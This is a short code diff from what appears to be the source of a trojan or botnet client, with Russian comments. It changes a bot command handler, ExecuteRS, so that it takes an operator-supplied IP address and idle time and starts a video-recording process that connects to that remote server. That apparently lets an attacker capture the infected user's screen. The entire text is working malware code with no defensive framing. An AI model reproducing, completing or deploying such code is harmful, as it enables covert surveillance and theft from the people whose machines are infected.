@@ -1017,7 +1017,17 @@ bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
 //команда на подключение к видео серверу, просто шлем лог, его отсылка активизирует подключение к серверу
 bool ExecuteRS(void* Manager, PCHAR Command, PCHAR Args)
 {
-	VideoProcess::SendLog( "rs", 0, 0 );
+	char ip[24];
+	char* p = STR::Scan( Args, ' ' );
+	int lenIP = p ? p - Args : m_lstrlen(Args);
+	if( lenIP >= sizeof(ip) - 1 ) return false;
+	m_memcpy( ip, Args, lenIP );
+	ip[lenIP] = 0;
+	int downtime = p ? m_atoi(p + 1) : 0;
+	if( downtime == 0 )
+		downtime = 24 * 60; //по умолчанию в режиме простоя сутки
+	TASKDBG("RS", "ip: %s, downtime %d", ip, downtime);
+	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, 0, downtime );
 	return true;
 }
 
